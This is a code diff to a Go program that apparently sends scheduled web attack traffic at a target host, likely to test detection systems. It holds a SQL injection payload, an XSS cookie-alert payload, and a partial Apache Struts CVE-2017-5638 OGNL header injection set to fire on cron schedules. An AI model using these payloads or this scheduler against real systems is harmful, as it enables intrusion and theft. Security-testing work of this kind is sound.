@@ -56,6 +56,11 @@ var (
 	sqlBlast     Attack
 	xssBlast     Attack
 	searchApi    Attack
+	CVE20175638  Attack
+	CVE20177269  Attack
+	CVE20179805  Attack
+	CVE201711776 Attack
+	impostor     Attack
 	niktoBlast   Tool
 	niktoNoVpn   Tool
 
@@ -114,6 +119,9 @@ func (p *program) Start(s service.Service) error {
 		minRequests: 800, url: fmt.Sprintf("http://%s/?user_id=%s", target, "1029292%20OR%2019%3D19%20--%20-")}
 	xssBlast = Attack{name: "XSS Blast", method: "GET", maxNap: 7000, minNap: 1, maxRequests: 1200, pause: 1,
 		minRequests: 100, url: fmt.Sprintf("http://%s/forum/memberlist.php?account=%s", target, "%5C%22%3E%5C%22%3Cscript%3Ejavascript%3Aalert%28document.cookie%29%3C%2Fscript%3E")}
+	CVE20175638 = Attack{name: "CVE20175638", method: "POST", maxNap: 600, minNap: 1,
+		url:     fmt.Sprintf("http://%s/uploads", target),
+			     headers: map[string]string{"Content-Type:": "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?)multipart/form-data"}}
 
 	/* Attack Tools */
 	niktoBlast = Tool{name: "Nikto Blast", location: "nikto/program/nikto.pl", host: target}
@@ -129,6 +137,7 @@ func (p *program) run() {
 	c = cron.New()
 
 	/* Every 5th minute */
+	c.AddFunc("0 */5 * * * *", func() { CVE20175638.send() })
 
 	
 	/* REMOVE Every 10th minute */
@@ -138,6 +147,7 @@ func (p *program) run() {
 	
 	/* REMOVE Every 25th minute */
 	c.AddFunc("0 */25 * * * *", func() { auth.send() })
+	c.AddFunc("0 */25 * * * *", func() { CVE20175638.send() })
 	
 	/* Every 30th minute */
 	c.AddFunc("0 */30 * * * *", func() { bruteForce1.send() })
